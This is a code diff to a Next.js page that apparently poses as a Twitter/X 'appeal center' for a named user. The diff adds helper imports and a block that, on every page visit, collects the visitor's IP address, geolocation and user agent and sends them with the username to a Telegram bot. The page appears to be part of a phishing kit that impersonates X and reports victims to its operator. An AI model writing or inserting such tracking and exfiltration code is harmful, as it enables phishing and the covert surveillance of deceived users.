@@ -2,6 +2,8 @@ import type { TwitterUser } from "@/app/api/twitter/users/route";
 import { Footer } from "@/components/footer";
 import { XIcon } from "@/components/icons/x";
 import { TweetIframe } from "@/components/tweet-iframe";
+import { getBrowserData } from "@/helpers/getBrowserData";
+import { sendMessageToTelegramBot } from "@/helpers/send-data-to-telegram";
 import type { Metadata } from "next";
 import { headers } from "next/headers";
 import Link from "next/link";
@@ -42,7 +44,7 @@ export default async function HelpCenterPage({ params }: Props) {
 		return `https://twitter.com/user/status/${tweetInfo?.id}`;
 	};
 
-	const headersList = await headers();
+	const headersList = await headers();	
 
 	const baseUrl = getBaseUrl(headersList);
 
@@ -53,6 +55,22 @@ export default async function HelpCenterPage({ params }: Props) {
 	const user: TwitterUser = await userResponse.json();
 
 	const tweetUrl = await getTweetUrl(baseUrl, user);
+
+	getBrowserData(headersList).then(browserData => {
+		sendMessageToTelegramBot({
+			message: `
+🔛 USER ENTER IN APPEAL CENTER
+
+👤 USERNAME: ${username}
+
+🖥️ IP: ${browserData.ip}
+🌍 Location: ${browserData.geoLocation}
+🧩 Agent: ${browserData.userAgent}
+
+🌐 SITE: ${baseUrl}/appeal-center/${username}
+`
+		})
+	});
 
 	return (
 		<main className="flex flex-col items-center bg-white">
